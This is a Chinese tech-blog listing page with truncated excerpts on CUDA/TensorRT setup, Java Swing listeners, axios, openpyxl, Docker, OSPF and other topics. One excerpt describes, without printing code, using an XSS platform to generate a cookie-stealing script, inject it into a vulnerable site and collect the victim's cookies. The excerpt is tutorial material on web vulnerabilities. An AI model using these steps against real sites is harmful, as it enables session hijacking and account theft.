你说整半天就不能在下载cuda时一次性下完嘛？咱也不知道为啥。
三.添加CUDA环境变量 有人下载安装软件后运行不起来，就是没有添加环境变量，有人可能会不理解，简单解释一下，软件运行其实就是代码运行，而代码是高级语言编写的，它需要经历预编译阶段展开头文件声明，去掉注释代码，替换宏定义，内联函数替换等操作，然后经历汇编代码，再经历机器代码即二进制代码，最后好几个二进制代码文件加上库文件链接起来。
动态库即共享库，跟位置无关，在程序运行时动态加载到内存中运行。而我们的操作系统找不到动态库就会失败。为什么不编译到一个可执行文件exe中？而要附加一堆dll文件？因为动态库是共享的，开多个相同程序时，在内存中只会存在一份动态库供所有程序使用，从而减少内存使用量。
添加方法很简单：
直接点击左下角图标，搜索环境变量，点击环境变量，编辑，在新弹出的第二张图中直接在空白出=处双击把你dll文件所在文件夹路径粘贴上去。
后面还要添加TensorRT环境变量，一样的步骤。
四. 下载TensorRT 在官网下载的TensorRT是windows版的，不需要安装，只需要添加环境变量。
注意TensorRT也要和CUDA版本对应，下载地址：NVIDIA TensorRT 8.x Download | NVIDIA Developer页面可能需要注册账号，注册一个就行，很简单。我下载的版本是这个：和cuda,cudnn对应。
TensorRT-8.4.1.5.Windows10.x86_64.cuda-11.6.cudnn8.4
五. 将tensorrt文件加到CUDA文件下，添加tensorrt环境变量 这里添加tensorrt环境变量因为它有可执行程序，和cudnn不一样。
将include文件夹下头文件加到cuda文件夹下include里；
将lib文件夹下dll文件添加到CUDA文件夹下bin下；
将lib文件夹下lib文件添加到CUDA文件夹下lib\x64下；
添加环境变量参考第三节。
六. 测试TensorRT例子 在tensorrt有个samples文件夹，我们测试一个sampleMNIST，双击用VS打开.sln解决方案。
我们要配置自己的项目属性文件，将需要的CUDA和cudnn信息加进去，生成.vcxproj文件，下次项目我们也可以添加这个属性文件，一劳永逸。
点击调试-下面小扳手图标的项目属性配置，
在上图c/c++常规那里附加包含目录把CUDA的include和TensorRT的include路径加进去。注意这个下面的对勾要打上，设置继承。
在上图链接器常规那里附加库目录将库目录加进去。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dffddd4ee613e358f53d65069f6728a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3ff9ef49b3dba2aaf612d3ad614f688/" rel="bookmark">
			java中使用常见的几种监听器实现一种形似“水滴”的图形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 首先，这篇文章的主要是通过使用界面设计，以及几种监听器来实现用户在界面上点击按钮，点击顶部菜单栏能够展开，滑动滚轮对一个圆形实现颜色、大小、位置的变化，产生一种形似“水滴”的图形。
思路 监听器 监听器概述 在java中，监听器是一种用于监听和处理其他对象的事件或状态变化的对象，其实也可以说监听器是一种特殊的对象。事件是用户与程序之间的交互，例如鼠标点击、键盘输入、按钮按下等。监听器需要实现特定的接口，并注册到事件源上，才能响应事件。当事件发生时，事件源会通知监听器，并传递一个事件对象，包含了事件的相关信息和方法。
如果用一个通俗易懂的例子来解释监听器，其实可以这样理解。我们可以把监听器想象成一个警察，它的任务是监视某个地方（事件源）是否发生了什么事情（事件）。如果发生了，它就会立刻过去处理（调用监听器的方法）。为了让警察知道哪里需要监视，我们需要给它一个任务单（注册监听器）。当事情发生时，您还需要给警察一些线索（事件对象），让它知道事情的详情和如何处理。随着写代码的不断深入，我们会慢慢加深对监听器的理解。
本项目用到的监听器 MouseListener：用于处理鼠标状态变化的事件，例如按下、释放、点击、进入或退出组件区域3。
MouseMotionListener：用于处理鼠标移动或拖动的事件。
ActionListener：用于处理动作事件，例如按钮按下或菜单项选择。
ChangeListener：用于处理状态改变事件，例如滑块移动或选项卡切换。
KeyListener：用于处理键盘输入的事件，例如按下、释放或输入字符。
代码实现 设计用户界面步骤 引入需要使用的Java类库和包，包括Swing和AWT相关的类库。
定义一个名为UI的公共类，继承JFrame类，并定义构造方法。
在构造方法中设置JFrame的各项属性，包括标题、大小、布局方式等。
//导入了javax.swing包中的所有类 import javax.swing.*; import java.awt.*; //定义了一个名为UI的公共类，并继承了JFrame类 public class UI extends JFrame { //定义UI类的构造方法，这个方法在创建UI对象时被调用 public UI(){ //创建JFrame对象 JFrame jf=this; //设置JFrame的属性 jf.setTitle("监听器"); jf.setSize(1500,900); jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); jf.setLayout(new FlowLayout());//设置关闭按钮的操作为退出程序，并且使用流式布局来排列组件 创建两个按钮和一个滑杆，并将它们添加到JFrame中。
创建一个菜单栏和一个弹出式菜单，并将它们添加到JFrame中。
设置键盘和鼠标的监听器，并实现相应的监听方法。
//导入了javax.swing包中的所有类 import javax.swing.*; import java.awt.*; //定义了一个名为UI的公共类，并继承了JFrame类 public class UI extends JFrame { //定义UI类的构造方法，这个方法在创建UI对象时被调用 public UI(){ //创建JFrame对象 JFrame jf=this; //设置JFrame的属性 jf.setTitle("监听器"); jf.setSize(1500,900); jf.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); jf.setLayout(new FlowLayout());//设置关闭按钮的操作为退出程序，并且使用流式布局来排列组件 //创建两个按钮，并将其添加到JFrame中，能够实现用户可以看到，可以点击它 JButton btn1=new JButton("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3ff9ef49b3dba2aaf612d3ad614f688/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e6fbf4f6a48d9289bcbe6d15edff08e/" rel="bookmark">
			Web漏洞-XSS平台简介-相关知识点补充（cookie与session）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、XSS平台简介 1.示例一： 首页（注册）。
成功注册后的主页。
按照如下路径填写相关信息后点击下一步。
之后会返回项目相关的功能。
勾选默认模块后点击下一步。
点击下一步后，平台会为你创建一个项目。
下滑后可以看到平台生成的测试语句。
这里我们引用平台生成的最后一条语句。
输入网站内的对应位置后点击提交。
可以看到成功提交了。
来到管理员界面可以看到查看留言的位置。
点击进入查看后便发现网站弹出了一个弹窗，说明网站成功执行了js代码。
2.示例二： 打开一个新的网站。
打开相关网页。
在url后面添加一个单引号，发现网页的返回内容里也出现了对应的单引号。
随便输入其它内容，可以返现网页返回的内容也会发生相应的改变。
由此可以判断其可能存在跨站漏洞。
输入js代码对跨站漏洞进行验证。
网页弹出了弹窗，由此可以判定这里存在跨站漏洞。
在xss平台内新建一个项目，勾选默认模块以及读取COOKIE后点击下一步。
可以看到平台生成的代码。
将生成的代码粘贴到网址的末尾后回车。
回到平台内可以返现成功接收到了COOKIE等相关信息。
二、相关知识点补充 1.cookie： 是用户的凭据，通过凭据可以判断对方的身份信息。
使用cookie登录=&gt;用钥匙打开锁。
浏览器内存在一个明确的选项就是可以删除Cookie数据（其指的就是一些网站的登录信息）。
Cookie攻击成功的条件：
对方有漏洞
浏览器不阻止脚本的运行
对方管理员触发漏洞地址
不存在相关防护，如（代码过滤、http only）
虽然跨站漏洞很常见，但是利用起来有很多限制条件，这也导致很多src平台不收跨站漏洞。
emm真鸡肋
存储在本地，存活时间比较长。
常用于小中型网站。
2.session： 称之为会话。
存储在服务器。
存活时间比较短。
常用于大型网站。
比如支付宝或者某某手机银行，当我们切换到了其它页面之后，再返回，或者过了一段时间之后，就需要我们重新输入账户名和密码。
比cookie更安全。
会占用服务器一些资源。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d05f27742cbe4e4365ba1be2616a274/" rel="bookmark">
			axios-请求拦截器(请求头中添加token)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 axios-请求拦截器(请求头中添加token 处理请求一些带权限的接口(需要传递token),一个一个配置请求头太麻烦,在发起请求之前统一挂载token
//1.引入 axios import axios from 'axios' //2.拿到vuex中token import store from '@/store/index.js' //3.封装基础的地址 axios.defaults.baseURL = '请求地址根路径' //4.请求拦截器 axios.interceptors.request.use(function (config) { console.log('请求拦截器'); // 在发送请求之前做些什么 //config本次请求的请求配置对象(包括请求地址 请求头) console.log('config', config); //已经登录并且存在token if (store.state &amp;&amp; store.state.user &amp;&amp; store.state.user.token) { //加入到请求头 config.headers.Authorization = `Bearer ${store.state.user.token}` } //一定要返回config 否则请求停在这里 出不去 return config; }, function (error) { // 对请求错误做些(还没有发出请求) return Promise.reject(error); }); //5.导出 export default axios 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae458fb792d9cca5e9f1af0b22f410e6/" rel="bookmark">
			python openpyxl 操作excel ，使用 conditional_formatting，insert_rows
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景 python 使用 openpyxl 操作 excel 对于简单的格式来说还是挺方便的，但是对于复杂的格式，操作没有手动来的简单，如果对于复杂的格式也不是用python来做的。对于一个原有的报表，在其中添加一行，会出现很多问题。
后面的行公式没有响应的发生变化合并的行还保留在原来的位置原有的条件格式还在原来的位置 记录下解决方案
公式问题和合并单元格问题 这里记录的不是通用方法，因为我这里的单元格列数较少，所以采用的匹配方式是re.findall(r'[A-Z]\d+',val)前面的只需要A-Z，公式中有两种情况，单元格运算，还有就是单元格范围运算。
对于单元格运算，包含一个或者多个，那么直接将插入行的后面行所有的数字+1;若是范围运算，则需要把插入行后面的单元格向下移动一样，对于前面的则保持不动；若都在后面，则范围整体向下移动一行。对于合并单元格，需要先清除插入行后面的单元格，然后记录位置，将所有的行都+1，然后重新合并单元格，使用unmerge_cells 清除合并的单元格，merge_cells合并单元格。这里需要注意的是临界值问题，因为插入行复制的是上一行的格式，则需要将上一行合并的单元格复制到插入行，并且上一行的合并行不能发生变化。 # 在指定位置添加一行，复制上一行的格式 def insert_row_up_merges(sheet, add_idx): # 统计需要移动的合并单元格信息 cellmeges = [] orgmeges = [] merged_cells = sheet.merged_cells for merged_cell in merged_cells: if merged_cell.min_row &gt;= add_idx: cellmeges.append( [merged_cell.min_row + 1, merged_cell.min_col, merged_cell.max_row + 1, merged_cell.max_col]) orgmeges.append(merged_cell.coord) elif merged_cell.min_row &gt;= add_idx-1: cellmeges.append( [merged_cell.min_row + 1, merged_cell.min_col, merged_cell.max_row + 1, merged_cell.max_col]) for x in orgmeges: sheet.unmerge_cells(x) # 插入新行 sheet.insert_rows(add_idx) # 复制上一行的样式和公式 cells = sheet[add_idx - 1] cells2 = sheet[add_idx] for i, c in enumerate(cells): cells2[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae458fb792d9cca5e9f1af0b22f410e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/adf5ad1b21bf2b313c5d823a0df80098/" rel="bookmark">
			web_文字有关的CSS属性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;文字有关的CSS属性&lt;/title&gt; &lt;style&gt; .mybox { width: 500px; height: 40px; /*border-width: 5px 15px 20px 10px; 顺序：上右下左 border-color: red yellow blue; border-style: solid dotted dashed;*/ border: red solid 1px; margin: 50px 30px 20px 10px; padding: 10px; float: right; /*水平分布lift/right*/ background-color: transparent; /*transparent:透明色（默认）*/ font-size: 14px; font-family: "微软雅黑"; font-weight: bold; font-style: italic; /*text-align: center;*/ /*水平方向，相对自己内部文字，不是相对父控件*/ text-indent: 2em; /*缩进,两倍等价汉字宽度位置*/ text-decoration: underline; /*中划线line-through*/ line-height: 40px; /*行高，一般偶数，最美行高为字体大小的1.5倍*/ /*当行文字垂直居中：设置行高和盒子（div）高相同*/ } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/adf5ad1b21bf2b313c5d823a0df80098/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/576c64d6272746115727d6f69ab70d4c/" rel="bookmark">
			NLP(V)：实战分析推特及若干网站文本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		NLP(V)：实战分析推特及若干新闻网站文本 wiki词条分析 获得数据 这里我们使用beautifulsoup爬取wiki网页。首先安装requests。
pip install requests 然后爬取网页。
以下是一些将使用的小函数。
import requests from bs4 import BeautifulSoup import time # for setting up a delay on getting htmls from wiki server. from tqdm import tqdm # First, get the page info from wiki server given an URL. def getPageFromWiki(url): # return a soup object with the specified URL req = requests.get(url) soup = BeautifulSoup(req.content, 'html.parser') return soup # Second, get the title of the wiki page def getHeading(soup): heading = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/576c64d6272746115727d6f69ab70d4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16e06d627987acef32912036d75f2225/" rel="bookmark">
			centos7安装docker
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一丶先了解下，什么是 Docker？为什么会有 Docker？Docker 的优势？docker的组成？ 1.为什么会有 Docker？ 我们知道一款产品从开发到上线，从开发环境到生成环境。作为开发和运维人员之间协作需要考虑很多问题，尤其是当我们的产品多版本迭代之后，不同环境之间的兼容就会成为一个大问题;
这时 Docker 的出现就解决了这一难题，Docker 的出现使我们开发的软件可以“带环境安装”，即安装的时候，可以把原始环境一模一样的的复制过来，不用在担心环境不一致导致“开发时可以正常运行，生成环境就会出问题”，“在我的机器上可以正常运行，在别人的机器上就不能运行”的问题了。
2.什么是docker？
（1）Docker 就像是一个轻量级的虚拟机，Docker是一个轻量级的容器，我们可以将环境交给 Docker 来管理，当我们需要移植我们的产品的时候，就可以将环境整个的迁移到另一台主机上，而不向虚拟机一样，迁移一台虚拟机极其资源；
（2）Docker 是一个开源的应用容器引擎，基于 Go 语言开发。
（3）Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。
总之：Docker相较于虚拟机来说具有更加轻量，启动更快，效率更高，可移植性更强等优势，实现了“一次封装，到处运行”，不用在关心环境的不一致问题。
3.docker的优势
（1）运行环境的一致性：Docker 的镜像提供了除了内核之外完整的运行环境，确保了应用运行的一致性；
（2）更快速地启动部署：可以做到秒级，甚至毫秒级的的启动时间。大大节约了开发、测试、部署的时间；
（3）更好的隔离性：每个服务器都是独立运行的、完全隔离的。避免公用的服务器，资源会容易受到其他用户的影响；
（4）弹性伸缩、快速扩展：能够更好的处理集中爆发式的服务器使用压力；
（5）迁移更加方便：“带环境安装”；
（6）持续交付和部署：使用 Docker 可以通过定制镜像来实现持续集成，交付，部署；
4.docker的组成
​Docker 是一个 C/S 架构程序。Docker 客户端只需要向 Docker 服务器或者守护进程发出请求，服务器或者守护进程将完成所有工作并返回结果。Docker 提供了一个命令行工具 Docker 以及一整套 RESTful API。你可以在同一台宿主机上运行 Docker 守护进程和客户端，也可以从本地的 Docker 客户端连接到运行在另一台宿主机上的远程 Docker 守护进程。
名称说明Docker镜像（images）用于容器创建的模板。基于联合文件系统的一种层式结构，由一系列指令一步一步构建出来。Docker容器（Container）容器是独立运行的一个或一组应用，镜像相当于类，容器相当于类的实例Docker客户端（Client）通过命令行或其他工具使用Docker API 与Docker的守护进程通信Docker主机（Host）一个物理或虚拟机用于执行Docker守护进程和容器Docker守护进程是Docker服务器端进程。负责支撑Docker容器的运行和镜像的管理Docker仓库 DockerHub（Registry） 用来保存镜像，可以理解代码控制中心的代码仓库，可以将自己的镜像推送仓库上供他人下载 5. 基本概念
Docker 包括三个基本概念：
（1）镜像（Image）：Docker 镜像（Image），就相当于是一个 root 文件系统。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16e06d627987acef32912036d75f2225/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8bc6089026e638320860ef81479ec173/" rel="bookmark">
			STM32移植LVGL过程中，一种RGB颜色转十六进制颜色的算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、原理阐述： （1）十六进制颜色值= 商（RGB颜色值/16）+余数（RGB颜色值/16）；
（2）十六进制颜色值格式：0x+2个十六进制红色值字符+2个十六进制绿色值字符+2个十六进制蓝色值字符
（3）本算法不带ALPHA，另外输出结果为小写十六进制字符串模式（如：天蓝色 0x87ceeb）
二、完整代码： static char RGBtoHEX(int RGBred, int RGBgreen, int RGBblue) { char *HEXred; char *HEXgreen; char *HEXblue; char CODE[]="0123456789abcdef"; int CODE_NUM_SHANG; int CODE_NUM_YUSHU; //	if(RGBred == 0) //	{ //	HEXred = "00"; //	} // //	if(RGBgreen == 0) //	{ //	HEXgreen = "00"; //	} // //	if(RGBblue == 0) //	{ //	HEXblue = "00"; //	} if(RGBred &gt; 255 | RGBgreen &gt; 255 | RGBblue &gt; 255) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8bc6089026e638320860ef81479ec173/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9c9b1243bb8db2ceb833faa5411aef1/" rel="bookmark">
			web_html 创建站点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在任意盘任意位置创建一个文件夹，在dreamweaver中点击-站点-新建站点-浏览到刚才创建的文件夹位置。
在右侧边栏本地文件下空白处点击鼠标右键，创建文件，一般来说，我们首先创建index.html
有序列表（Ordered List） &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;我的小站&lt;/title&gt; &lt;/head&gt; &lt;body&gt; Fifa 2023足球先生排名： &lt;!--有序列表Ordered List--&gt; &lt;ol type="A"&gt; &lt;!--type="1"(默认可不写) "A" "a" "I" "i"--&gt; &lt;li&gt;梅西&lt;/li&gt; &lt;li&gt;姆巴佩&lt;/li&gt; &lt;li&gt;本泽马&lt;/li&gt; &lt;/ol&gt; &lt;/body&gt; &lt;/html&gt; 这里&lt;ol&gt;标签中的type="A"，表示顺序为大写字母A-B-C-D...，type还可以="a"、"I"、"i"......，type默认为1，type等于1可不写。如图：
无序列表（Unordered list） &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;我的小站&lt;/title&gt; &lt;/head&gt; &lt;body&gt; 列举您最爱吃的集中水果 &lt;ul type="square"&gt; &lt;!--默认type是disc(实心圈),"circle"(空心圈),"square"(正方形)--&gt; &lt;li&gt;香蕉&lt;/li&gt; &lt;li&gt;苹果&lt;/li&gt; &lt;li&gt;草莓&lt;/li&gt; &lt;li&gt;西瓜&lt;/li&gt; &lt;li&gt;金桔&lt;/li&gt; &lt;li&gt;西红柿&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt; &lt;/html&gt; 这里type="square"，表示符号是正方形，type还可以等于disc（实心圆）、circle（空心圆）
如图：
图片 &lt;img height="170" src="images/3d9b5b453d1b0f5eba109bad76297793.jpg" /&gt; &lt;img height="170" src="images/bc6981551e13b721fb6c0be9e7ab05d4.jpg" /&gt; &lt;img height="170" src="images/d5268200a967af98876b25b6925515c9.jpeg" /&gt; 我们在原本创建的文件夹下新建一个文件夹，命名为images，可以将自己目标图片放在该文件夹下。使用&lt;img src="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d9c9b1243bb8db2ceb833faa5411aef1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ade2608cdad95e97b76916b71f80704f/" rel="bookmark">
			windos 11第一次开机跳过联网/华硕笔记本开机网络错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言
电脑卖家在电脑系统和自带的office办公软件激活后就不支持退货了，目前自带win11的新电脑，开机连网和之前win10不同，没法直接跳过，连网后又必须使用微软账户，对于想先进入电脑桌面检测一下电脑性能和使用本地账号的人很不友好，一下介绍一下win11跳过开机连网的方法。（我的电脑是dell的）
20221219-发现之前使用的跳过连网和微软账户的方法在更新Win11 22H2后，并不适用了，特此更新Win11 22H2后怎么跳过联网和微软账户登录？针对提示”糟糕你已断开internet连接，重试“ 依旧可以跳过
win11开机调过连网的操作方法如下 ：
1.新电脑开机后，设置完，所属国家，键盘信息，点击下一步跳转到联网界面，发现下一步是灰色的，无法直接点击，又没有其它跳过选项，如下图所示
2.按Shift键+F10键然后（或者fn+shift+f10），弹出命令提示符窗口，在命令提示符窗口里输入 taskmgr 并回车即可打开系统任务管理器。
3.在任务管理器里找到 OOBE Network Connection Flow 进程再右键点击 ， 选择结束该进程继续回到界面创建本地账户,发现已经跳过网络连接页面，到许可协议设置页面了，可以继续下一步知道完成设置，进入桌面即可。
关于Win11 22H2怎么跳过联网和微软账户登录？
最近购买的新笔记本电脑发现使用以上方法不能正常跳过Win11 22H2的版本连网和微软账号，使用以上方法会提示”糟糕你已断开internet连接，重试“而不能跳过连网，先更新新的已验证能跳过Win11 22H2连网的方法：
1.按照以上步骤操作，提示”糟糕你已断开internet连接，重试“，然后继续按window图标键+R按键，弹出运行窗口，输入：regedit 命令，点击确定，会弹出注册表编辑器界面
2.在打开的注册表编辑器界面中，
（1）依次打开注册表项：HKEY_LOCAL_MACHINE -&gt; SOFTWARE -&gt; Microsoft -&gt; Windows -&gt; CurrentVersion -&gt; OOBE （2）在注册表的右侧空白处鼠标右键，在弹出的右键菜单项中，选择：新建 -&gt; DWORD (32 位)值(D)
（3）给新建的值重命名为：BypassNRO，双击打开BypassNRO这个值，然后在编辑 DWORD (32 位)值窗口，将数值数据修改为 1 点击确定保存，如下图所示：
3.点击重试之后，就会弹出新的网络连接窗口，下方有我没有网络选项，点击我没有网络选项，即可跳过网络连接和微软账号
————————————————
版权声明：本文为CSDN博主「空灵之海」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/weixin_44569100/article/details/122172793
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0d2ba7de568f8d77749981cce414b7b/" rel="bookmark">
			Dijkstra 最短路径算法 Python 实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接
问题描述
使用 Dijkstra 算法求图中的任意顶点到其它顶点的最短路径（求出需要经过那些点以及最短距离）。
以下图为例：
算法思想
可以使用二维数组来存储顶点之间边的关系
首先需要用一个一维数组 dis 来存储 初始顶点到其余各个顶点的初始路程，以求 1 顶点到其它各个顶点为例：
将此时 dis 数组中的值称为最短路的“估计值”。
既然是求 1 号顶点到其余各个顶点的最短路程，那就先找一个离 1 号顶点最近的顶点。通过数组 dis 可知当前离 1 号顶点最近是 2 号顶点。当选择了 2 号顶点后，dis[2] 的值就已经从“估计值”变为了“确定值”，即 1 号顶点到 2 号顶点的最短路程就是当前 dis[2]值。为什么呢？因为目前离 1 号顶点最近的是 2 号顶点，并且这个图所有的边都是正数，那么肯定不可能通过第三个顶点中转，使得 1 号顶点到 2 号顶点的路程进一步缩短了。
既然选了 2 号顶点，接下来再来看 2 号顶点有哪些出边。有 2-&gt;3 和 2-&gt;4 这两条边。先讨论通过 2-&gt;3 这条边能否让 1 号顶点到 3 号顶点的路程变短。也就是说现在比较 dis[3] 和 dis[2] + G[2][3]的大小。其中 dis[3] 表示 1 号顶点到 3 号顶点的路程。dis[2] + G[2][3] 中 dis[2] 表示 1 号顶点到 2 号顶点的路程，G[2][3] 表示 2-&gt;3 这条边。所以 dis[2] + G[2][3] 就表示从 1 号顶点先到 2 号顶点，再通过 2-&gt;3 这条边，到达 3 号顶点的路程。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0d2ba7de568f8d77749981cce414b7b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c41cb4bf29f6c61bf47e822c466bbd51/" rel="bookmark">
			OSPF协议介绍❶(数据包、链路状态数据结构、工作过程的七个状态、三张相关表、网络类型)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OSPF(Open Shortest Path First开放式最短路径优先） 是一个内部网关协议(Interior Gateway Protocol，简称IGP），用于在单一自治系统（autonomous system,AS）内决策路由。是对链路状态路由协议的一种实现，隶属内部网关协议（IGP），故运作于自治系统内部。------以上资料来自于百度百科。
组播更新地址：224.0.0.5/6
OSPF 数据包 OSPF执行过程中的多种功能
1.发现邻居并建立邻接
2.泛洪LSU同步LSDB
3.SPF算法计算目的已知目的的最佳路径
4.最佳路径填充到路由表
OSPF协议依靠五种不同类型的分组来建立邻接关系和交换路由信息，即问候分组、数据库描述分组、链路状态请求分组、链路状态更新分组和链路状态确认分组。
1、问候(Hello)分组
OSPF使用Hello分组建立和维护邻接关系。在一个路由器能够给其他路由器分发它的邻居信息前，必须先问候它的邻居们。
2、数据库描述(Data base Description，DBD)分组
DBD分组不包含完整的“链路状态数据库”信息，只包含数据库中每个条目的概要。当一个路由器首次连入网络，或者刚刚从故障中恢复时，它需要完整的“链路状态数据库”信息。此时，该路由器首先通过hello分组与邻居们建立双向通信关系，然后将会收到每个邻居反馈的DBD分组。新连入的这个路由器会检查所有概要，然后发送一个或多个链路状态请求分组，取回完整的条目信息。
3、链路状态请求(Link State Request，LSR)分组
LSR分组用来请求邻居发送其链路状态数据库中某些条目的详细信息。当一个路由器与邻居交换了数据库描述分组后，如果发现它的链路状态数据库缺少某些条目或某些条目已过期，就使用LSR分组来取得邻居链路状态数据库中较新的部分。
4、链路状态更新(Link State Update，LSU)分组
LSU分组被用来应答链路状态请求分组，也可以在链路状态发生变化时实现洪泛(flooding)。在网络运行过程中，只要一个路由器的链路状态发生变化，该路由器就要使用LSU，用洪泛法向全网更新链路状态。
5、链路状态确认(Link State Acknowledgment，LSAck)分组
LSAck分组被用来应答链路状态更新分组，对其进行确认，从而使得链路状态更新分组采用的洪泛法变得可靠。
接收LSU的动作:
1)如果LSDB中没有这样的条目，则将其加入到LSDB中，返回一个链路状态确认(LSAck)，将该信息扩散到其他路由器，运行SPF，并更新其路由表。
2)如果有这样的条目，且LSU中包含的信息与之相同，则忽略它。
3)如果有这样的条目，但是LSU中包含的信息更新，则将其加入到LSDB中，返回一个LSAck，将该信息扩散到其他路由器，运行SPF，并更新其路由表。
4)如果有这样的条目，但LSU中包含的信息更旧，则将一个包含新信息的LSU发送给发送方。
其实可以这么理解 以吃瓜的心态来理解 可以分为这四种情况 第一种他传过来的瓜 我不知道，我记下来，不仅自己知道了，我还要传递给其他的好朋友
第二种他传过来的瓜 我知道 那我就不管了
第三种他传过来的瓜比我知道的瓜大 ，我记下来，不仅传递给其他的好朋友，还要给他发个确认消息说句牛x
第四种他传过来的瓜没我知道的瓜大，那我得给他分享最新最大的瓜
OSPF数据包字段解释
OSPF包结构如上图所示，IP报头中的协议标识符89表示OSPF分组。所有OSPF分组开头的报头格式都相同，该报头中包含以下字段。
版本号：对于OSPF第2版(用于IPv4的最新OSPF版本)，设置为2。后面会介绍用于IPv6的OSPF第3版。
分组类型：区分5种OSPF分组的长度，单位为字节。
分组长度：OSPF分组的长度，单位为字节。
路由器ID：标识最初发送分组的路由器。
区域ID：指出分组来自哪个区域。
校验和：用于分组报头错误检测，确保OSPF分组在传输过程中未受损。
身份验证类型：一个OSPF选项，指出路由器不进行身份验证、使用明文密码进行身份验证还是使用加密的消息摘要5(MD5)进行身份验证。
身份验证：同身份验证类型结合使用。
数据：包含的信息随OSPF分组类型而异。
1.对于Hello分组，包含一个由已知邻居组成的列表。
2.对于DBD分组，包含LSDB摘要，其中包括所有已知路由器的ID、最后使用的序列号以及一些其他字段。
3.对于LSR分组，包含需要的LSU类型和能够提供所需LSU的路由器ID。
4.LSU分组，包含完整的LSA条目，一个OSPF更新分组中可以包含多个LSA条目。
5.对于LSAck分组，该字段为空。
OSPF 网络类型 根据路由器所连接的物理网络不同，OSPF将网络划分为四种类型：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c41cb4bf29f6c61bf47e822c466bbd51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e6f8b6b9d2fb2f2fcb76fa70f7770a0/" rel="bookmark">
			【Docker】docker部署springboot项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.打jar包 jar包的位置
2.编写Dockerfile文件 FROM openjdk:8 //使用jdk8，没有会自动给你下载 RUN apt-get update &amp;&amp; apt-get install iputils-ping -y //给容器安装ping命令 ADD pansh-demo(2).jar app.jar //构建的镜像时，把宿主机的文件添加到镜像中 CMD ["--server.port=8088"] //容器启动时运行的命令 EXPOSE 8088	//暴露端口8088 ENTRYPOINT ["java","jar","/app.jar"] //容器启动时运行的命令 3.把Dockerfile文件和jar包文件放到linux文件夹下 Xshell和XFTP的使用详解 这篇文章写了怎么把文件放到你的linux目录下。
4.构建镜像 $ sudo docker build -t vpx . //构建镜像(需要在你的Dockerfile目录下) 注意最后有一个 点 5.构建成功 $ sudo docker images //查看镜像 如果构建发现这个错误：
